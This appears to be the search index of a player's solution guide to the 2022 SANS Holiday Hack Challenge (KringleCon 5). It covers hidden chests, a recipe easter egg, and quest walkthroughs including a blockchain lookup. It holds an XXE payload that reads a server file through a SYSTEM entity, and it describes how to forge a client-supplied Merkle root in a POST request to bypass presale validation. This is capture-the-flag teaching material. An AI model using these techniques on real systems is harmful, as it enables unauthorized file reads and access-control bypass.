{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to KringleCon 5: Golden Rings! Introduction Welcome reader, to my 2022 SANS Holiday Hack Challenge Solution Guide. I'm Nutmeg, and this is my fifth year attending KringleCon. First off, as always, I want to thank Ed Skoudis, the Counter Hack team, and all of the great KringleCon presenters. Once again, the team did a fantastic job producing an event that was both entertaining and educational. I also want to thank my wife Kim, who once again resigned herself as a 'KringleCon Widow' for several weeks during the holiday season while I indulged myself in this event. Lastly, and in no particular order, I want to acknowledge the following individuals from the Discord channel, without whose help I might still be bashing my head against the wall with Glamtariel's Fountain . Annah bsleep higgy Fogez t4r human Report Format This report is written as a guide to explain how I was able to solve each of the objectives. I make no assertion that the methods I used are the best or most effective, or even if they are how the designer of the objective intended it to be solved ( Open the Boria Mine Door ). Many objectives will have more than one way to complete them, and for some I have included several of the possible options ( Windows Event Logs , Prison Escape ), but this is by no means the case for every objective. As this is a guide and not a full walk through of KringleCon, and to keep the length to something resembling the 50 page maximum submission size, I have omitted much of the character dialogs, story elements, LoTR references, etc. that are not directly related to the solving of objectives. Dialogs, hints, and other resources are in in expandable call-outs to keep the page lengths down, and all answer values are similarly hidden by default for those readers who are just looking for hints and don't want to see spoilers. This writeup is also not as dependent on screenshots as my submissions in previous years have been, again in an attempt to keep the length as efficient as possible. Platform and Tools The majority of the objectives were completed on an Intel based PC running Windows 11 Home, and the primary web browser used was Firefox. Wireshark and Burp Suite Community Edition were used in some way or another for many of the challenges. The writeup itself was created using Material for MkDocs and is hosted on GitHub Pages . Any necessary screenshots were taken using ShareX , and code / writeup editing was done with Visual Studio Code .","title":"Welcome"},{"location":"#welcome-to-kringlecon-5-golden-rings","text":"","title":"Welcome to KringleCon 5: Golden Rings!"},{"location":"#introduction","text":"Welcome reader, to my 2022 SANS Holiday Hack Challenge Solution Guide. I'm Nutmeg, and this is my fifth year attending KringleCon. First off, as always, I want to thank Ed Skoudis, the Counter Hack team, and all of the great KringleCon presenters. Once again, the team did a fantastic job producing an event that was both entertaining and educational. I also want to thank my wife Kim, who once again resigned herself as a 'KringleCon Widow' for several weeks during the holiday season while I indulged myself in this event. Lastly, and in no particular order, I want to acknowledge the following individuals from the Discord channel, without whose help I might still be bashing my head against the wall with Glamtariel's Fountain . Annah bsleep higgy Fogez t4r human","title":"Introduction"},{"location":"#report-format","text":"This report is written as a guide to explain how I was able to solve each of the objectives. I make no assertion that the methods I used are the best or most effective, or even if they are how the designer of the objective intended it to be solved ( Open the Boria Mine Door ). Many objectives will have more than one way to complete them, and for some I have included several of the possible options ( Windows Event Logs , Prison Escape ), but this is by no means the case for every objective. As this is a guide and not a full walk through of KringleCon, and to keep the length to something resembling the 50 page maximum submission size, I have omitted much of the character dialogs, story elements, LoTR references, etc. that are not directly related to the solving of objectives. Dialogs, hints, and other resources are in in expandable call-outs to keep the page lengths down, and all answer values are similarly hidden by default for those readers who are just looking for hints and don't want to see spoilers. This writeup is also not as dependent on screenshots as my submissions in previous years have been, again in an attempt to keep the length as efficient as possible.","title":"Report Format"},{"location":"#platform-and-tools","text":"The majority of the objectives were completed on an Intel based PC running Windows 11 Home, and the primary web browser used was Firefox. Wireshark and Burp Suite Community Edition were used in some way or another for many of the challenges. The writeup itself was created using Material for MkDocs and is hosted on GitHub Pages . Any necessary screenshots were taken using ShareX , and code / writeup editing was done with Visual Studio Code .","title":"Platform and Tools"},{"location":"extras/Hidden_Chests/","text":"Hidden Chests Throughout the North Pole Subterranean Labyrinth there are 6 hidden chests that will give you KringleCoins, Hints, and other goodies if you can figure out how to reach them. Hints and Resources Other resources Burp Suite Community Edition https://portswigger.net/burp/communitydownload Finding the Chests The best way that I discovered to locate the chests is to simply zoom out your browser window as far as you can and wander the area. Hall of Talks NPSL (Outside Tolkien Ring) Tolkien Ring NPSL (Outside Elfen Ring) Cloud Ring NPSL (Outside Burning Ring of Fire) Reaching the Chests Reaching the chests is a matter of locating the hidden 'path' that will allow you to reach them. While this can be done by running yourself into walls until you find your way blindly in the dark, we can find a way to simplify things if we investigate the image elements that make up the site. Each area of the map is made up of several image layers, including /images/backgrounds/*area*_foreground.png , and /images/background/*area*_mask.png image. The combination of these layers is what hides our avatar when we move into the darkened areas of the map. If we can prevent our browser from loading these images, then while it will distort what we see on the screen, it will allow us to see ourselves as we move through this hidden region, making it much easier to find the path. To do this using Chrome based browsers you can setup a local override for these images (Developer Tools > Sources > Overrides), and there are extensions for Firefox that will do the same. But in my case I opted to use the ever useful Burp Suite. In Burp Suite, simply add two lines to the 'Match and Replace' section of the Proxy Options that will replace mask.png and foreground.png with nothing. Note that this will result in invalid requests for the element /images/backgrounds/*area*_ , but the page will still load fine. Chest Rewards Standing on the chests will give you various rewards. In my playthrough all the chests gave me KringleCoins. 2 of the 6 gave me hints for the Blockchain Divination objective, and while the other 4 indicated they were giving me hints for Exploit a Smart Contract , only 2 hints were received. And one gave me a special Tophat. Hall of Talks 13 KringleCoins Hint: A Solid Hint NPSL 1 27 KringleCoins Hint: Cryptostage Tolkien Ring 15 KringleCoins Hint: Plant a Merkle Tree NPSL 2 25 KringleCoins Hint: Markle Tree Aboriculture Cloud Ring 10 KringleCoins Hint for Smart Contract (nothing given) NPSL 3 20 KringleCoins Tophat #1 Hint for Smart Contract (nothing given)","title":"Hidden Chests"},{"location":"extras/Hidden_Chests/#hidden-chests","text":"Throughout the North Pole Subterranean Labyrinth there are 6 hidden chests that will give you KringleCoins, Hints, and other goodies if you can figure out how to reach them.","title":"Hidden Chests"},{"location":"extras/Hidden_Chests/#hints-and-resources","text":"Other resources Burp Suite Community Edition https://portswigger.net/burp/communitydownload","title":"Hints and Resources"},{"location":"extras/Hidden_Chests/#finding-the-chests","text":"The best way that I discovered to locate the chests is to simply zoom out your browser window as far as you can and wander the area. Hall of Talks NPSL (Outside Tolkien Ring) Tolkien Ring NPSL (Outside Elfen Ring) Cloud Ring NPSL (Outside Burning Ring of Fire)","title":"Finding the Chests"},{"location":"extras/Hidden_Chests/#reaching-the-chests","text":"Reaching the chests is a matter of locating the hidden 'path' that will allow you to reach them. While this can be done by running yourself into walls until you find your way blindly in the dark, we can find a way to simplify things if we investigate the image elements that make up the site. Each area of the map is made up of several image layers, including /images/backgrounds/*area*_foreground.png , and /images/background/*area*_mask.png image. The combination of these layers is what hides our avatar when we move into the darkened areas of the map. If we can prevent our browser from loading these images, then while it will distort what we see on the screen, it will allow us to see ourselves as we move through this hidden region, making it much easier to find the path. To do this using Chrome based browsers you can setup a local override for these images (Developer Tools > Sources > Overrides), and there are extensions for Firefox that will do the same. But in my case I opted to use the ever useful Burp Suite. In Burp Suite, simply add two lines to the 'Match and Replace' section of the Proxy Options that will replace mask.png and foreground.png with nothing. Note that this will result in invalid requests for the element /images/backgrounds/*area*_ , but the page will still load fine.","title":"Reaching the Chests"},{"location":"extras/Hidden_Chests/#chest-rewards","text":"Standing on the chests will give you various rewards. In my playthrough all the chests gave me KringleCoins. 2 of the 6 gave me hints for the Blockchain Divination objective, and while the other 4 indicated they were giving me hints for Exploit a Smart Contract , only 2 hints were received. And one gave me a special Tophat. Hall of Talks 13 KringleCoins Hint: A Solid Hint NPSL 1 27 KringleCoins Hint: Cryptostage Tolkien Ring 15 KringleCoins Hint: Plant a Merkle Tree NPSL 2 25 KringleCoins Hint: Markle Tree Aboriculture Cloud Ring 10 KringleCoins Hint for Smart Contract (nothing given) NPSL 3 20 KringleCoins Tophat #1 Hint for Smart Contract (nothing given)","title":"Chest Rewards"},{"location":"extras/Jason/","text":"Jason Jason once again makes his appearance at the North Pole, this time as the resting canary at the bottom of the Subterranean Labyrinth.","title":"Jason"},{"location":"extras/Jason/#jason","text":"Jason once again makes his appearance at the North Pole, this time as the resting canary at the bottom of the Subterranean Labyrinth.","title":"Jason"},{"location":"extras/Ram_Bambidil/","text":"Ram Bambidil After retrieving the ring list during the Glamtariel's Fountain objective, if we give the Princess the Green Ring via the XXE method, we get an interesting dialog. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE root[ <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/greenring.txt\"> ]> <root> <imgDrop> &xxe; </imgDrop> <who> princess </who> <reqType> xml </reqType> </root> Object Dropped On Princess Fountain greenring.txt princess Hey, who is this guy? He doesn't have a ticket! I don't remember seeing him in the movies! We also have a new value in the 'visit' property, telling us to go to https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/tomb2022-tommyeasteregg3847516894.png , where we get the following image.","title":"Ron Bambidil"},{"location":"extras/Ram_Bambidil/#ram-bambidil","text":"After retrieving the ring list during the Glamtariel's Fountain objective, if we give the Princess the Green Ring via the XXE method, we get an interesting dialog. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE root[ <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/greenring.txt\"> ]> <root> <imgDrop> &xxe; </imgDrop> <who> princess </who> <reqType> xml </reqType> </root> Object Dropped On Princess Fountain greenring.txt princess Hey, who is this guy? He doesn't have a ticket! I don't remember seeing him in the movies! We also have a new value in the 'visit' property, telling us to go to https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/tomb2022-tommyeasteregg3847516894.png , where we get the following image.","title":"Ram Bambidil"},{"location":"extras/Recipe/","text":"Contents of the Original Lembanh Recipe file Discoverable during the Windows Event Logs objective. Recipe from Mixolydian, the Queen of Dorian Lembanh Original Recipe 2 1/2 all purpose flour 1 Tbsp baking powder 1/4 tsp salt 1/2 c butter 1/3 c brown sugar 1 tsp cinnamon 1/2 tsp honey (secret ingredient) 2/3 c heavy whipping cream 1/2 tsp vanilla extract Preheat oven to 425F. Mix the flour, baking powder and salt into a large bowl. Add the butter and mix with a well till fine granules (easiest way is with an electric mixer). Then add the sugar and cinnamon, and mix them thoroughly. Finally add the cream, honey, and vanilla and stir them in with a fork until a nice, thick dough forms. Roll the dough out about 1/2 in thickness. Cut out 3-inch squares and transfer the dough to a cookie sheet.Criss-cross each square from corner-to-corner with a knife, lightly (not cutting through the dough). Bake for about 12 minutes or more (depending on the thickness of the bread) until it is set and lightly golden. Let cool completely before eating, this bread tastes better room temperature and dry. Also for more flavor you can add more cinnamon or other spices","title":"Lembanh Recipie"},{"location":"extras/Recipe/#contents-of-the-original-lembanh-recipe-file","text":"Discoverable during the Windows Event Logs objective. Recipe from Mixolydian, the Queen of Dorian Lembanh Original Recipe 2 1/2 all purpose flour 1 Tbsp baking powder 1/4 tsp salt 1/2 c butter 1/3 c brown sugar 1 tsp cinnamon 1/2 tsp honey (secret ingredient) 2/3 c heavy whipping cream 1/2 tsp vanilla extract Preheat oven to 425F. Mix the flour, baking powder and salt into a large bowl. Add the butter and mix with a well till fine granules (easiest way is with an electric mixer). Then add the sugar and cinnamon, and mix them thoroughly. Finally add the cream, honey, and vanilla and stir them in with a fork until a nice, thick dough forms. Roll the dough out about 1/2 in thickness. Cut out 3-inch squares and transfer the dough to a cookie sheet.Criss-cross each square from corner-to-corner with a knife, lightly (not cutting through the dough). Bake for about 12 minutes or more (depending on the thickness of the bread) until it is set and lightly golden. Let cool completely before eating, this bread tastes better room temperature and dry. Also for more flavor you can add more cinnamon or other spices","title":"Contents of the Original Lembanh Recipe file"},{"location":"quests/KringleCon_Orientation/","text":"KringleCon Orientation Introduction This quest line takes place in the Staging / Orientation area and introduces you to KringleCon and gets you setup with several beginning objectives Objective: Talk to Jingle Ringford Difficulty : Jingle Ringford will start you on your journey Objective: Get your badge Difficulty : Pick up your badge Objective: Create a wallet Difficulty : Create a crypto wallet Objective: Use the terminal Difficulty : Click the computer terminal Objective: Talk to Santa Talk to Santa in front of the castle to get your next objectives. Solution Talk to Jingle Ringford Pretty self expanitory. Click on Jingle Ringford to talk with him and get further instructions. Get your badge Click on your badge to open it and receive your starting objectives. Create a wallet Click on the KringleCoin Teller Machine (KTM) and follow the instructions provided to create your KringleCoin wallet. Warning Do not forget to take a screenshot of and / or copy paste your wallet address and private key. This is your ONLY opportunity to record your private key, which you will absolutely need for the rest of the challenges. Use the terminal Open the terminal and answer the question. Answer answer Talk to Santa After using the terminal the gate will open. Enter the North Pole / Castle Approach and speak to Santa to collect your first set of quest objectives.","title":"KringleCon Orientation"},{"location":"quests/KringleCon_Orientation/#kringlecon-orientation","text":"","title":"KringleCon Orientation"},{"location":"quests/KringleCon_Orientation/#introduction","text":"This quest line takes place in the Staging / Orientation area and introduces you to KringleCon and gets you setup with several beginning objectives Objective: Talk to Jingle Ringford Difficulty : Jingle Ringford will start you on your journey Objective: Get your badge Difficulty : Pick up your badge Objective: Create a wallet Difficulty : Create a crypto wallet Objective: Use the terminal Difficulty : Click the computer terminal Objective: Talk to Santa Talk to Santa in front of the castle to get your next objectives.","title":"Introduction"},{"location":"quests/KringleCon_Orientation/#solution","text":"","title":"Solution"},{"location":"quests/KringleCon_Orientation/#talk-to-jingle-ringford","text":"Pretty self expanitory. Click on Jingle Ringford to talk with him and get further instructions.","title":"Talk to Jingle Ringford"},{"location":"quests/KringleCon_Orientation/#get-your-badge","text":"Click on your badge to open it and receive your starting objectives.","title":"Get your badge"},{"location":"quests/KringleCon_Orientation/#create-a-wallet","text":"Click on the KringleCoin Teller Machine (KTM) and follow the instructions provided to create your KringleCoin wallet. Warning Do not forget to take a screenshot of and / or copy paste your wallet address and private key. This is your ONLY opportunity to record your private key, which you will absolutely need for the rest of the challenges.","title":"Create a wallet"},{"location":"quests/KringleCon_Orientation/#use-the-terminal","text":"Open the terminal and answer the question. Answer answer","title":"Use the terminal"},{"location":"quests/KringleCon_Orientation/#talk-to-santa","text":"After using the terminal the gate will open. Enter the North Pole / Castle Approach and speak to Santa to collect your first set of quest objectives.","title":"Talk to Santa"},{"location":"quests/Recover_the_Burning_Ring_of_Fire/","text":"Recover the Burning Ring of Fire This quest line takes place on the sixth level of the subterranean labyrinth and consists of 3 objectives. Buy a Hat Blockchain Divination Exploit a Smart Contract","title":"Recover the Burning Ring of Fire"},{"location":"quests/Recover_the_Burning_Ring_of_Fire/#recover-the-burning-ring-of-fire","text":"This quest line takes place on the sixth level of the subterranean labyrinth and consists of 3 objectives. Buy a Hat Blockchain Divination Exploit a Smart Contract","title":"Recover the Burning Ring of Fire"},{"location":"quests/Recover_the_Burning_Ring_of_Fire/14_Buy_a_Hat/","text":"Buy a Hat Buy a hat Difficulty : Travel to the Burning Ring of Fire and purchase a hat from the vending machine with KringleCoin. Find hints for this objective hidden throughout the tunnels. Elf Introduction Wombley Cube Hey there! I'm Wombley Cube. It's so nice to see a friendly face. What's an elf doing all the way down here with all these sporcs, you ask? I'm selling snazzy, fancy-pants hats! You can buy them with Kringlecoin. The reason I set up shop here is to gather intel on that shady Luigi. I'm a member of the STINC: Santa's Team of Intelligent Naughty Catchers. He and his gang are up to no good, I'm sure of it. We've got a real Code Brown here. Purchase a hat so we look inconspicuous, and I'll clue you in on what we think they're scheming. Of course, have a look at my inventory! Oh, and if you haven't noticed, I've slipped hints for defeating these Sporcs around the tunnels! Keep your eyes open, and you'll find all five of them. Wait, maybe it's six? Hints and Resources Hints from talking with Wombley Cube Hat Dispensary To purchase a hat, first find the hat vending machine in the Burning Ring of Fire. Select the hat that you think will give your character a bold and jaunty look, and click on it. A window will open giving you instructions on how to proceed with your purchase. Prepare to Spend Before you can purchase something with KringleCoin, you must first approve the financial transaction. To do this, you need to find a KTM; there is one in the Burning Ring of Fire. Select the Approve a KringleCoin transfer button. You must provide the target wallet address, the amount of the transaction you're approving, and your private wallet key. Wear it Proudly! You should have been given a target address and a price by the Hat Vending machine. You should also have been given a Hat ID #. Approve the transaction and then return to the Hat Vending machine. You'll be asked to provide the Hat ID and your wallet address. Complete the transaction and wear your hat proudly! Solution Open the hat vending machine Pick your hat Note the wallet address and Hat ID value Go to a KTM Approve a KringleCoin transfer Use the wallet address for the hat as the \"To\" address, 10 for the number of KringleCoins, and your wallet key for the key. After approving the transfer, go back to the hat vending machine Select the option to buy your hat Enter your wallet address, and the Hat ID that you purchased. Note , the transaction information provided may be helpful to you later. Select your hat from the badge menu and wear it proudly. Completion Wombley Cube Nice hat! I think Ed Skoudis would say the same. It looks great on you. So, here's what we've uncovered so far. Keep this confidential, ok? Earlier, I overheard that disgruntled customer in the office saying he wanted in on the \"rug pull\". If our suspicions are correct, that's why the sporcs want an invite to the presale so badly. Once the \"Bored Sporc Rowboat Society\" NFTs officially go on sale, the sporcs will upsell them. After most of the NFTs are purchased by unwitting victims, the Sporcs are going to take the money and abandon the project. Mission #1 is to find a way to get on that presale list to confirm our suspicions and thwart their dastardly scheme! We also think there's a Ring hidden there, so drop Mission #2 on them and rescue that ring! Thank you for your business, dear customer!","title":"Buy a Hat"},{"location":"quests/Recover_the_Burning_Ring_of_Fire/14_Buy_a_Hat/#buy-a-hat","text":"Buy a hat Difficulty : Travel to the Burning Ring of Fire and purchase a hat from the vending machine with KringleCoin. Find hints for this objective hidden throughout the tunnels.","title":"Buy a Hat"},{"location":"quests/Recover_the_Burning_Ring_of_Fire/14_Buy_a_Hat/#elf-introduction","text":"Wombley Cube Hey there! I'm Wombley Cube. It's so nice to see a friendly face. What's an elf doing all the way down here with all these sporcs, you ask? I'm selling snazzy, fancy-pants hats! You can buy them with Kringlecoin. The reason I set up shop here is to gather intel on that shady Luigi. I'm a member of the STINC: Santa's Team of Intelligent Naughty Catchers. He and his gang are up to no good, I'm sure of it. We've got a real Code Brown here. Purchase a hat so we look inconspicuous, and I'll clue you in on what we think they're scheming. Of course, have a look at my inventory! Oh, and if you haven't noticed, I've slipped hints for defeating these Sporcs around the tunnels! Keep your eyes open, and you'll find all five of them. Wait, maybe it's six?","title":"Elf Introduction"},{"location":"quests/Recover_the_Burning_Ring_of_Fire/14_Buy_a_Hat/#hints-and-resources","text":"Hints from talking with Wombley Cube Hat Dispensary To purchase a hat, first find the hat vending machine in the Burning Ring of Fire. Select the hat that you think will give your character a bold and jaunty look, and click on it. A window will open giving you instructions on how to proceed with your purchase. Prepare to Spend Before you can purchase something with KringleCoin, you must first approve the financial transaction. To do this, you need to find a KTM; there is one in the Burning Ring of Fire. Select the Approve a KringleCoin transfer button. You must provide the target wallet address, the amount of the transaction you're approving, and your private wallet key. Wear it Proudly! You should have been given a target address and a price by the Hat Vending machine. You should also have been given a Hat ID #. Approve the transaction and then return to the Hat Vending machine. You'll be asked to provide the Hat ID and your wallet address. Complete the transaction and wear your hat proudly!","title":"Hints and Resources"},{"location":"quests/Recover_the_Burning_Ring_of_Fire/14_Buy_a_Hat/#solution","text":"Open the hat vending machine Pick your hat Note the wallet address and Hat ID value Go to a KTM Approve a KringleCoin transfer Use the wallet address for the hat as the \"To\" address, 10 for the number of KringleCoins, and your wallet key for the key. After approving the transfer, go back to the hat vending machine Select the option to buy your hat Enter your wallet address, and the Hat ID that you purchased. Note , the transaction information provided may be helpful to you later. Select your hat from the badge menu and wear it proudly.","title":"Solution"},{"location":"quests/Recover_the_Burning_Ring_of_Fire/14_Buy_a_Hat/#completion","text":"Wombley Cube Nice hat! I think Ed Skoudis would say the same. It looks great on you. So, here's what we've uncovered so far. Keep this confidential, ok? Earlier, I overheard that disgruntled customer in the office saying he wanted in on the \"rug pull\". If our suspicions are correct, that's why the sporcs want an invite to the presale so badly. Once the \"Bored Sporc Rowboat Society\" NFTs officially go on sale, the sporcs will upsell them. After most of the NFTs are purchased by unwitting victims, the Sporcs are going to take the money and abandon the project. Mission #1 is to find a way to get on that presale list to confirm our suspicions and thwart their dastardly scheme! We also think there's a Ring hidden there, so drop Mission #2 on them and rescue that ring! Thank you for your business, dear customer!","title":"Completion"},{"location":"quests/Recover_the_Burning_Ring_of_Fire/15_Blockchain_Divination/","text":"Blockchain Divination Blockchain Divination Difficulty : Use the Blockchain Explorer in the Burning Ring of Fire to investigate the contracts and transactions on the chain. At what address is the KringleCoin smart contract deployed? Find hints for this objective hidden throughout the tunnels. Spork Introduction Slicmer Don't bug me, kid. Luigi needs me to keep an eye on these offers you can't refute. The boss told me to watch them for any shifty transactions from wallets that aren't on the pre-sale list. He said to use this Block Explo... Exploder... thing. With this, I can see all the movement of the uh... non-fungusable tokens. Once on the blockchain, it's there forever for the whole world to see. So if I spot anything that don't look right, I can let Luigi know, and Palzari will get to the bottom of it. She looks sweet, but she's actually the boss' enforcer. Have you talked to her yet? She even scares me! It sure would be fun to watch you get on her bad side. Heh heh. Hints and Resources Hints from Hidden Chests Cryptostage - From the NPSL (Outside Tolkien Ring) Look at the transaction information. There is a From: address and a To: address. The To: address lists the address of the KringleCoin smart contract. A Solid Hint - From the Hall of Talks Find a transaction in the blockchain where someone sent or received KringleCoin! The Solidity Source File is listed as KringleCoin.sol. Tom's Talk might be helpful! Other resources Tom Liston, A Curmudgeon Looks at Cryptocurrencies | KringleCon 2022 https://www.youtube.com/watch?v=r3zj9DPC8VY&list=PLjLd1hNA7YVy9Xd1pRtE_TKWdzsnkHcqQ&index=5&t=5s Solution Open the Blockchain Explorer terminal next to Slicmer The hardest part of this objective is understanding how transactions involving a blockchain smart contract work. Once we know that for a smart contract to process a transaction the transaction needs to be sent to the contract, we just need to find any transaction in the blockchain where KringleCoin was transferred or earned. One such transaction will be recorded in the block created when you bought your hat. Another place where you can find the address of the contract is in the block that created the contract and added it to the blockchain. This is usually early in the blockchain's existence. Hint very early. Hint Hint Like say, block #1. Lastly, since transactions involving KringleCoins are happening all the time, you can just browse the chain a bit and you are likely to come across one. KringleCoin smart contract address 0xc27A2D3DE339Ce353c0eFBa32e948a88F1C86554","title":"Blockchain Divination"},{"location":"quests/Recover_the_Burning_Ring_of_Fire/15_Blockchain_Divination/#blockchain-divination","text":"Blockchain Divination Difficulty : Use the Blockchain Explorer in the Burning Ring of Fire to investigate the contracts and transactions on the chain. At what address is the KringleCoin smart contract deployed? Find hints for this objective hidden throughout the tunnels.","title":"Blockchain Divination"},{"location":"quests/Recover_the_Burning_Ring_of_Fire/15_Blockchain_Divination/#spork-introduction","text":"Slicmer Don't bug me, kid. Luigi needs me to keep an eye on these offers you can't refute. The boss told me to watch them for any shifty transactions from wallets that aren't on the pre-sale list. He said to use this Block Explo... Exploder... thing. With this, I can see all the movement of the uh... non-fungusable tokens. Once on the blockchain, it's there forever for the whole world to see. So if I spot anything that don't look right, I can let Luigi know, and Palzari will get to the bottom of it. She looks sweet, but she's actually the boss' enforcer. Have you talked to her yet? She even scares me! It sure would be fun to watch you get on her bad side. Heh heh.","title":"Spork Introduction"},{"location":"quests/Recover_the_Burning_Ring_of_Fire/15_Blockchain_Divination/#hints-and-resources","text":"Hints from Hidden Chests Cryptostage - From the NPSL (Outside Tolkien Ring) Look at the transaction information. There is a From: address and a To: address. The To: address lists the address of the KringleCoin smart contract. A Solid Hint - From the Hall of Talks Find a transaction in the blockchain where someone sent or received KringleCoin! The Solidity Source File is listed as KringleCoin.sol. Tom's Talk might be helpful! Other resources Tom Liston, A Curmudgeon Looks at Cryptocurrencies | KringleCon 2022 https://www.youtube.com/watch?v=r3zj9DPC8VY&list=PLjLd1hNA7YVy9Xd1pRtE_TKWdzsnkHcqQ&index=5&t=5s","title":"Hints and Resources"},{"location":"quests/Recover_the_Burning_Ring_of_Fire/15_Blockchain_Divination/#solution","text":"Open the Blockchain Explorer terminal next to Slicmer The hardest part of this objective is understanding how transactions involving a blockchain smart contract work. Once we know that for a smart contract to process a transaction the transaction needs to be sent to the contract, we just need to find any transaction in the blockchain where KringleCoin was transferred or earned. One such transaction will be recorded in the block created when you bought your hat. Another place where you can find the address of the contract is in the block that created the contract and added it to the blockchain. This is usually early in the blockchain's existence. Hint very early. Hint Hint Like say, block #1. Lastly, since transactions involving KringleCoins are happening all the time, you can just browse the chain a bit and you are likely to come across one. KringleCoin smart contract address 0xc27A2D3DE339Ce353c0eFBa32e948a88F1C86554","title":"Solution"},{"location":"quests/Recover_the_Burning_Ring_of_Fire/16_Exploit_a_Smart_Contract/","text":"Exploit a Smart Contract Exploit a Smart Contract Difficulty : Exploit flaws in a smart contract to buy yourself a Bored Sporc NFT. Find hints for this objective hidden throughout the tunnels. Spork Introduction Luigi Psst. Hey, slick - over here. Myeah. You look like a sucker ahem I mean, savvy. I got some exclusive, very rare, very valuable NFTs for sale. But I run a KringleCoin-only business. Kapeesh? Ever buy somethin' with cryptocurrency before? Didn't think so, but if you wheel and deal with ya' pal Luigi here, now you can! But we're currently in pre-sale, and you gotta be on the list. Myeah, see? BSRS NFTs are a swell investment. They'll be worth a pretty penny, and that's a promise. So when they're purchasable, you better snatch 'em up before the other boneheads ahem I mean, eggheads do. I got a business to run. You can't buy nothin' right now, so scram. Kapeesh? Hints and Resources Hints from Hidden Chests Plant a Merkle Tree - From the Tolkien Ring You can change something that you shouldn't be allowed to change. This repo might help! Markle Tree Arboriculture - NPLS (Outside Elfen Ring) You're going to need a Merkle Tree of your own. Math is hard. Professor Petabyte can help you out. Other resources Prof. Qwerty Petabyte, You Can Still Have Fun With Non-Fungible Tokens | KringleCon 2022 https://www.youtube.com/watch?v=Qt_RWBq63S8&list=PLjLd1hNA7YVy9Xd1pRtE_TKWdzsnkHcqQ&index=4&t=6s Burp Suite Community Edition https://portswigger.net/burp/communitydownload Solution Open the Bored Sporc Rowboat Society terminal next to Luigi, and go to the Presale page. Here we find that in order to verify that we are on the presale list we need to enter our wallet address and proof values. Reviewing to Professor Petabyte's talk and his GitHub repo referenced to in the hints we learn that one of the big benefits to using a Merkle tree is that the producer of the blockchain only needs to store the root value of the tree in order to verify that an address is on the list. In fact, the professor's GitHub README file contains a hint as to how we can exploit this. Professor Petabyte The only value the NFT producer needs to keep in their blockchain code is the root value itself! Because keeping anything stored on the blockchain is expensive, this is a huge benefit! Of course, the root mustn't be able to be altered, which is why keeping it IN the smart contract on the blockchain is what smart developers do. If we've been conversing with the Sporcs for any length of time we can make an assumption that they are not smart developers, so it's likely they are storing the root to the Merkle tree somewhere unsafe. And sure enough, if we startup Burp Suite and capture the submission of any random values to the presale form we see that they are passing the root key as part of the request. So all we need to do is generate a Merkle tree of our own containing our wallet address, then provide that address and proof value to the form while altering the root value passed in the POST request to be the root value our our tree, and the validation should work. The Professor's GitHub repo includes a Python file that can be run directly on your local system, provided the necessary libraries are available, or as a Docker image. In either event, edit the allowlist variable in the code to contain your wallet address along with some other value, then run the script to generate a root and proof value. Validate that things will work by entering your address and proof into the web form, then intercepting the POST with Burp Suite and change the root value to our root, then forward it on. If all works as expected your address will be verified as being on the presale list. Then it's just a matter of approving a 100 KC transaction to the address 0xe8fC6f6a76BE243122E3d01A1c544F87f1264d3a, then coming back to the presale form and repeating the process with the 'Validate Only' box unchecked. After your transaction is complete, go to the Gallery page and find your Sporc. Note that once you know your Sporc number you can get it directly at the URL https://boredsporcrowboatsociety.com/TOKENS/TOKENIMAGES/BSRS###.png Conclusion Luigi What!? How'd you get on the list? What's that? You's a double agent, and you're actually workin' for us? I don't know if I buy that, but you're on the list, so... myeah. Somethin' about this ain't sittin' right with me, but there's no reversing transactions with cryptocurrency. That NFT is yours to keep, but if I find out you're lyin' to me, Palzari's gonna pay you a visit. Kapeesh?","title":"Exploit a Smart Contract"},{"location":"quests/Recover_the_Burning_Ring_of_Fire/16_Exploit_a_Smart_Contract/#exploit-a-smart-contract","text":"Exploit a Smart Contract Difficulty : Exploit flaws in a smart contract to buy yourself a Bored Sporc NFT. Find hints for this objective hidden throughout the tunnels.","title":"Exploit a Smart Contract"},{"location":"quests/Recover_the_Burning_Ring_of_Fire/16_Exploit_a_Smart_Contract/#spork-introduction","text":"Luigi Psst. Hey, slick - over here. Myeah. You look like a sucker ahem I mean, savvy. I got some exclusive, very rare, very valuable NFTs for sale. But I run a KringleCoin-only business. Kapeesh? Ever buy somethin' with cryptocurrency before? Didn't think so, but if you wheel and deal with ya' pal Luigi here, now you can! But we're currently in pre-sale, and you gotta be on the list. Myeah, see? BSRS NFTs are a swell investment. They'll be worth a pretty penny, and that's a promise. So when they're purchasable, you better snatch 'em up before the other boneheads ahem I mean, eggheads do. I got a business to run. You can't buy nothin' right now, so scram. Kapeesh?","title":"Spork Introduction"},{"location":"quests/Recover_the_Burning_Ring_of_Fire/16_Exploit_a_Smart_Contract/#hints-and-resources","text":"Hints from Hidden Chests Plant a Merkle Tree - From the Tolkien Ring You can change something that you shouldn't be allowed to change. This repo might help! Markle Tree Arboriculture - NPLS (Outside Elfen Ring) You're going to need a Merkle Tree of your own. Math is hard. Professor Petabyte can help you out. Other resources Prof. Qwerty Petabyte, You Can Still Have Fun With Non-Fungible Tokens | KringleCon 2022 https://www.youtube.com/watch?v=Qt_RWBq63S8&list=PLjLd1hNA7YVy9Xd1pRtE_TKWdzsnkHcqQ&index=4&t=6s Burp Suite Community Edition https://portswigger.net/burp/communitydownload","title":"Hints and Resources"},{"location":"quests/Recover_the_Burning_Ring_of_Fire/16_Exploit_a_Smart_Contract/#solution","text":"Open the Bored Sporc Rowboat Society terminal next to Luigi, and go to the Presale page. Here we find that in order to verify that we are on the presale list we need to enter our wallet address and proof values. Reviewing to Professor Petabyte's talk and his GitHub repo referenced to in the hints we learn that one of the big benefits to using a Merkle tree is that the producer of the blockchain only needs to store the root value of the tree in order to verify that an address is on the list. In fact, the professor's GitHub README file contains a hint as to how we can exploit this. Professor Petabyte The only value the NFT producer needs to keep in their blockchain code is the root value itself! Because keeping anything stored on the blockchain is expensive, this is a huge benefit! Of course, the root mustn't be able to be altered, which is why keeping it IN the smart contract on the blockchain is what smart developers do. If we've been conversing with the Sporcs for any length of time we can make an assumption that they are not smart developers, so it's likely they are storing the root to the Merkle tree somewhere unsafe. And sure enough, if we startup Burp Suite and capture the submission of any random values to the presale form we see that they are 